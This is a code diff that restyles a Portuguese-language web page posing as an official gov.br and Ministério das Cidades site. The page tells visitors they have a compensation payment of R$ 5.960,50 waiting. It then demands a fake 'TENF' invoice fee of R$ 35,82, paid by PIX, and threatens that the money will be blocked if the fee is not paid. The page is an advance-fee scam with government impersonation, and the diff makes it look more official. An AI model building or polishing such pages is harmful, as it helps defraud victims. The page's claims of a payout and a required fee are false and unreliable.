@@ -884,13 +884,38 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
 </head>
 <body>
   <!-- Cabeçalho Oficial Gov.br -->
-  <header>
-    <div class="gov-top-bar">
-      <a href="#" onclick="event.preventDefault();">
-        <img src="images/govbr-logo-large.png" alt="gov.br" class="logo-gov">
-      </a>
-    </div>
-  </header>
+ <header class="gov-header">
+  <img
+    fetchpriority="high"
+    decoding="async"
+    src="images/govbr-logo-large.png"
+    alt="gov.br"
+    class="logo-gov"
+  >
+</header>
+
+<style>
+  
+  .gov-header {
+    width: 100%;
+    max-width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    box-sizing: border-box;
+}
+
+.logo-gov {
+    display: block;
+    width: 100%;
+    max-width: 607px;
+    height: auto;
+    object-fit: contain;
+}
+
+
+</style>
 
   <!-- Área Principal com Fundo Azul Escuro -->
   <main class="acesso-main-section">
@@ -900,16 +925,137 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
       </div>
 
       <div class="amount">
-        <div class="amount-label">Indenização disponível:</div>
-        <div class="amount-value">R$ 5.960,50</div>
+        <div class="amount-label"><h2>Indenização disponível:</h2></div>
+        <div class="amount-value"><h2>R$ 5.960,50</h2></div>
       </div>
 
-      <div class="tax-box">
-        <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
-        <div class="tax-box-value">R$ 35,82</div>
-      </div>
+      <style>
+  .tax-box {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 16px 12px;
+    border: 2px solid #2478ff;
+    border-radius: 22px;
+    background: #ffffff;
+    text-align: center;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #102b5c;
+  }
 
-      <button id="paymentButton" class="button" onclick="checkout(event)">Efetuar pagamento da Taxa</button>
+  .tax-box-title {
+    font-size: 24px;
+    font-weight: 700;
+    line-height: 1.3;
+    margin-bottom: 4px;
+  }
+
+  .tax-box-value {
+    font-size: 32px;
+    font-weight: 700;
+    line-height: 1.2;
+  }
+
+  /* Ajustes para telas menores */
+  @media (max-width: 480px) {
+    .tax-box {
+      padding: 14px 10px;
+      border-radius: 20px;
+    }
+
+    .tax-box-title {
+      font-size: 18px;
+    }
+
+    .tax-box-value {
+      font-size: 26px;
+    }
+  }
+</style>
+
+<div class="tax-box">
+  <div class="tax-box-title">
+    <h5>TENF (Taxa de Emissão de Nota Fiscal)</h5>
+  </div>
+  <div class="tax-box-value"><h5>R$ 35,82</h5></div>
+</div>
+
+      <style>
+  #paymentButton {
+    width: 100%;
+    min-height: 74px;
+    padding: 16px 24px;
+    box-sizing: border-box;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 22px;
+
+    border: 1px solid #1764d8;
+    border-radius: 50px;
+
+    background: linear-gradient(
+      110deg,
+      #0646b9 0%,
+      #0755c9 50%,
+      #0646b9 100%
+    );
+
+    color: #ffffff;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 24px;
+    font-weight: 700;
+    line-height: 1.2;
+
+    cursor: pointer;
+
+    box-shadow:
+      0 3px 8px rgba(0, 54, 150, 0.18),
+      inset 0 1px 2px rgba(255, 255, 255, 0.15);
+
+    transition: filter 0.2s ease, transform 0.2s ease;
+  }
+
+  #paymentButton:hover {
+    filter: brightness(1.08);
+  }
+
+  #paymentButton:active {
+    transform: scale(0.98);
+  }
+
+  #paymentButton .payment-icon {
+    width: 38px;
+    height: 30px;
+    flex-shrink: 0;
+    display: block;
+  }
+
+  @media (max-width: 480px) {
+    #paymentButton {
+      min-height: 64px;
+      padding: 14px 16px;
+      gap: 12px;
+      font-size: 18px;
+    }
+
+    #paymentButton .payment-icon {
+      width: 30px;
+      height: 24px;
+    }
+  }
+</style>
+
+<button
+  id="paymentButton"
+  class="button"
+  type="button"
+  onclick="checkout(event)"
+>
+
+
+  <span><h4>Efetuar pagamento da Taxa</h4></span>
+</button>
       <div id="loadingMessage">Gerando código PIX...</div>
 
       <!-- Container do PIX Pepper -->
@@ -946,19 +1092,117 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
         </div>
       </div>
 
-      <div class="info-box">
-        Para receber o valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). Que
-        corresponde ao custo gerado por transferências de alto valor, após o pagamento será feito a transferência
-        imediata da sua indenização para sua chave pix cadastrada. Caso não conclua o pagamento dessa taxa, sua
-        indenização será bloqueada.
-      </div>
+      <style>
+  .info-box {
+    width: 100%;
+    box-sizing: border-box;
+    display: flex;
+    align-items: flex-start;
+    gap: 22px;
+
+    padding: 24px 22px;
+    border-radius: 22px;
+    border: 1px solid #e4ebf7;
+
+    background: linear-gradient(
+      135deg,
+      #f0f4fb 0%,
+      #e9eff9 100%
+    );
+
+    color: #102653;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 22px;
+    font-weight: 400;
+    line-height: 1.45;
+  }
+
+  .info-box-icon {
+    width: 42px;
+    height: 42px;
+    flex: 0 0 42px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    margin-top: 0;
+    border-radius: 50%;
+    background: #0752bd;
+    color: #ffffff;
+
+    font-family: Georgia, serif;
+    font-size: 32px;
+    font-weight: 700;
+    font-style: italic;
+    line-height: 1;
+  }
+
+.info-box-text {
+  flex: 1;
+  min-width: 0;
+  text-align: left;
+}
+
+  @media (max-width: 480px) {
+    .info-box {
+      gap: 14px;
+      padding: 18px 16px;
+      border-radius: 18px;
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    .info-box-icon {
+      width: 32px;
+      height: 32px;
+      flex-basis: 32px;
+      font-size: 24px;
+    }
+  }
+</style>
+
+<div class="info-box">
+  <div class="info-box-icon" aria-hidden="true">i</div>
+
+  <div class="info-box-text"><b>
+    Para receber o valor, é obrigatório realizar o pagamento do TENF
+    (Taxa de Emissão de Nota Fiscal). Que corresponde ao custo gerado
+    por transferências de alto valor, após o pagamento será feito a
+    transferência imediata da sua indenização para sua chave pix
+    cadastrada. Caso não conclua o pagamento dessa taxa, sua
+    indenização será bloqueada. </b>
+  </div>
+</div>
     </div>
   </main>
 
   <!-- Rodapé com Logotipos Oficiais -->
-  <footer class="gov-footer-logos">
-    <img src="images/min-cidades-gov-logo-1-1.png" alt="Ministério das Cidades - Governo Federal">
-  </footer>
+<footer class="gov-footer-logos">
+    <img
+        src="images/min-cidades-gov-logo-1-1.png"
+        alt="Ministério das Cidades - Governo Federal"
+    >
+</footer>
+
+<style>
+.gov-footer-logos {
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    display: block;
+    overflow: hidden;
+}
+
+.gov-footer-logos img {
+    display: block;
+    width: 100%;
+    height: auto;
+    max-width: none;
+    margin: 0;
+    padding: 0;
+}
+</style>
+
 
 
 <script src="../../checkout/Upsells/01/pepper-api.js"></script>
